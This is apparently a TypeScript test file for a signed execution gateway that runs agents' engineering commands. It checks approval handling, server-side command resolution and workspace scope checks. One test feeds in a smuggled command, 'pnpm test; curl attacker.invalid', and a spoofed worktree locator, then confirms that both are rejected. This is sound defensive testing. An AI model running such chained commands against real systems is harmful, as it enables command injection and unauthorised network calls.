import {
  EngineeringCommandProfileSchema,
  EngineeringRepositorySchema,
  EngineeringWorkspaceSchema,
} from "@alexa-control/shared";
import { describe, expect, it, vi } from "vitest";

import type { ExecutionService } from "../execution/service.js";
import type { ExecutionStore } from "../execution/store.js";
import { InMemoryEngineeringRuntimeStore } from "../engineering-runtime/store.js";
import { SignedExecutionEngineeringGateway } from "./signed-gateway.js";
import { EngineeringTransportScopeVerifier } from "../engineering-runtime/transport.js";

const ownerId = "10000000-0000-4000-8000-000000000001";
const companyId = "20000000-0000-4000-8000-000000000002";
const repositoryId = "30000000-0000-4000-8000-000000000003";
const workspaceId = "40000000-0000-4000-8000-000000000004";
const taskId = "50000000-0000-4000-8000-000000000005";
const agentId = "60000000-0000-4000-8000-000000000006";
const now = "2026-09-16T00:00:00.000Z";

describe("SignedExecutionEngineeringGateway", () => {
  it("does not reuse a CREATING record as a completed worktree after approval interruption", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    runtime.createWorkspace(EngineeringWorkspaceSchema.parse({
      schemaVersion: "1", id: workspaceId, ownerId, companyId, repositoryId,
      taskId, agentId, idempotencyKey: taskId, branchName: "alexa/test",
      worktreeLocator: `ew-${workspaceId}`, baseCommit: "a".repeat(40), headCommit: null,
      state: "CREATING", leaseOwner: null, leaseExpiresAt: null, leaseGeneration: 0,
      createdAt: now, updatedAt: now, expiresAt: null,
    }));
    const gateway = new SignedExecutionEngineeringGateway({} as ExecutionService, {} as ExecutionStore, runtime);
    const dispatch = vi.spyOn(gateway as unknown as { dispatch: () => Promise<unknown> }, "dispatch")
      .mockRejectedValueOnce(new Error("An exact matching explicit approval is required."))
      .mockResolvedValueOnce({ output: {} });
    const input = {
      ownerId, companyId, repositoryId, taskId, agentId, idempotencyKey: taskId, slug: "test",
      transport: { sessionId: crypto.randomUUID(), requestId: crypto.randomUUID(), ipAddress: "127.0.0.1", networkState: "PRIVATE_NETWORK" as const },
    };
    await expect(gateway.create(input)).rejects.toThrow("explicit approval");
    expect(runtime.findWorkspace(ownerId, companyId, workspaceId)?.state).toBe("CREATING");
    await expect(gateway.create(input)).resolves.toMatchObject({ id: workspaceId });
    expect(runtime.findWorkspace(ownerId, companyId, workspaceId)?.state).toBe("READY");
    expect(dispatch).toHaveBeenCalledTimes(2);
  });
  it("resolves a registered command server-side and enqueues the finite request through the existing signed transport", async () => {
    const runtime = new InMemoryEngineeringRuntimeStore();
    runtime.saveRepository(
      EngineeringRepositorySchema.parse({
        schemaVersion: "1",
        id: repositoryId,
        ownerId,
        companyId,
        displayName: "Repository",
        workspaceLocatorId: "repo-main",
        defaultBranch: "main",
        protectedBranches: ["main"],
        protectedPaths: [],
        generatedPaths: [],
        commandProfileId: "node-default",
        capabilityProfileId: "engineering-default",
        authorizedAgentIds: [agentId],
        metadata: {
          languages: ["TypeScript"],
          packageManagers: ["pnpm"],
          frameworks: [],
          importantFiles: ["package.json"],
        },
        status: "ACTIVE",
        createdAt: now,
        updatedAt: now,
      }),
    );
    runtime.saveCommandProfile(
      EngineeringCommandProfileSchema.parse({
        schemaVersion: "1",
        id: "node-default",
        ownerId,
        companyId,
        displayName: "Node",
        commands: [
          {
            id: "test",
            executable: "pnpm",
            args: ["test"],
            kind: "TEST",
            timeoutMs: 60_000,
            maxOutputBytes: 16_384,
            networkPolicy: "DENY",
          },
        ],
        validationOrder: ["test"],
        status: "ACTIVE",
        createdAt: now,
        updatedAt: now,
      }),
    );
    runtime.createWorkspace(
      EngineeringWorkspaceSchema.parse({
        schemaVersion: "1",
        id: workspaceId,
        ownerId,
        companyId,
        repositoryId,
        taskId,
        agentId,
        idempotencyKey: taskId,
        branchName: "alexa/500000000000-000004-backend",
        worktreeLocator: `ew-${workspaceId}`,
        baseCommit: "a".repeat(40),
        headCommit: null,
        state: "READY",
        leaseOwner: null,
        leaseExpiresAt: null,
        leaseGeneration: 0,
        createdAt: now,
        updatedAt: now,
        expiresAt: null,
      }),
    );
    let transportRequest: Record<string, unknown> | undefined;
    let executionInput:
      | {
          ownerId: string;
          sessionId: string;
          requestId: string;
          networkState: string;
          request: Record<string, unknown>;
        }
      | undefined;
    const createEngineeringExecution = vi.fn(
      (input: {
        ownerId: string;
        sessionId: string;
        requestId: string;
        networkState: string;
        request: Record<string, unknown>;
      }) => {
        executionInput = input;
        transportRequest = input.request;
        return Promise.resolve({ id: "execution-1" });
      },
    );
    const executionStore = {
      getResult: vi.fn(() =>
        Promise.resolve({
          status: "SUCCEEDED",
          result: {
            schemaVersion: "1",
            operationId: transportRequest?.operationId,
            capability: transportRequest?.capability,
            output:
              transportRequest?.capability === "repository.integrate_commit"
                ? {
                    integrated: true,
                    commit: "b".repeat(40),
                    headCommit: "c".repeat(40),
                    conflictPaths: [],
                  }
                : {
                    commandId: "test",
                    exitCode: 0,
                    stdout: "ok",
                    stderr: "",
                    startedAt: now,
                    completedAt: now,
                    durationMs: 1,
                    timedOut: false,
                    cancelled: false,
                    truncated: false,
                    networkIsolated: true,
                  },
          },
        }),
      ),
      find: vi.fn(),
      cancel: vi.fn(),
      list: vi.fn(() => Promise.resolve([])),
    };
    const gateway = new SignedExecutionEngineeringGateway(
      { createEngineeringExecution } as unknown as ExecutionService,
      executionStore as unknown as ExecutionStore,
      runtime,
      () => new Date(now),
      1_000,
    );
    const result = await gateway.invoke({
      ownerId,
      companyId,
      repositoryId,
      workspaceId,
      taskId,
      agentId,
      capability: "repository.run_command",
      operationInput: {
        commandId: "test",
        command: "pnpm test; curl attacker.invalid",
      },
      signal: new AbortController().signal,
      transport: {
        sessionId: "70000000-0000-4000-8000-000000000007",
        requestId: "80000000-0000-4000-8000-000000000008",
        ipAddress: "100.64.0.1",
        networkState: "PRIVATE_NETWORK",
      },
    });
    expect(createEngineeringExecution).toHaveBeenCalledOnce();
    expect(executionInput).toMatchObject({
      ownerId,
      sessionId: "70000000-0000-4000-8000-000000000007",
      networkState: "PRIVATE_NETWORK",
    });
    expect(executionInput?.requestId).toBe(transportRequest?.requestId);
    expect(transportRequest).toMatchObject({
      companyId,
      repositoryId,
      engineeringWorkspaceId: workspaceId,
      agentId,
      capability: "repository.run_command",
      input: {
        command: {
          id: "test",
          executable: "pnpm",
          args: ["test"],
          networkPolicy: "DENY",
        },
      },
    });
    expect(JSON.stringify(transportRequest)).not.toContain("attacker.invalid");
    expect(result.output).toMatchObject({ commandId: "test", exitCode: 0 });

    const integrationWorkspaceId = crypto.randomUUID();
    const objectiveId = crypto.randomUUID();
    runtime.createWorkspace(
      EngineeringWorkspaceSchema.parse({
        schemaVersion: "1",
        id: integrationWorkspaceId,
        ownerId,
        companyId,
        repositoryId,
        taskId: objectiveId,
        agentId,
        idempotencyKey: "integration-test",
        branchName: "alexa/integration-test",
        worktreeLocator: `ew-${integrationWorkspaceId}`,
        baseCommit: "a".repeat(40),
        headCommit: null,
        state: "READY",
        leaseOwner: null,
        leaseExpiresAt: null,
        leaseGeneration: 0,
        createdAt: now,
        updatedAt: now,
        expiresAt: null,
      }),
    );
    await gateway.invoke({
      ownerId,
      companyId,
      repositoryId,
      workspaceId: integrationWorkspaceId,
      taskId: objectiveId,
      agentId,
      capability: "repository.integrate_commit",
      operationInput: {
        commit: "b".repeat(40),
        sourceWorkspaceId: workspaceId,
        sourceWorktreeLocator: "attacker-selected",
      },
      signal: new AbortController().signal,
      transport: {
        sessionId: "70000000-0000-4000-8000-000000000007",
        requestId: "80000000-0000-4000-8000-000000000008",
        ipAddress: "100.64.0.1",
        networkState: "PRIVATE_NETWORK",
      },
    });
    expect(transportRequest).toMatchObject({
      taskId: objectiveId,
      engineeringWorkspaceId: integrationWorkspaceId,
      capability: "repository.integrate_commit",
      input: {
        commit: "b".repeat(40),
        sourceWorkspaceId: workspaceId,
        sourceWorktreeLocator: `ew-${workspaceId}`,
      },
    });
    expect(
      await new EngineeringTransportScopeVerifier(runtime).verify({
        ownerId,
        request: transportRequest as never,
      }),
    ).toBe(true);
    expect(
      await new EngineeringTransportScopeVerifier(runtime).verify({
        ownerId,
        request: {
          ...transportRequest,
          input: {
            ...(transportRequest?.input as object),
            sourceWorktreeLocator: "ew-00000000-0000-4000-8000-000000000000",
          },
        } as never,
      }),
    ).toBe(false);
  });
});
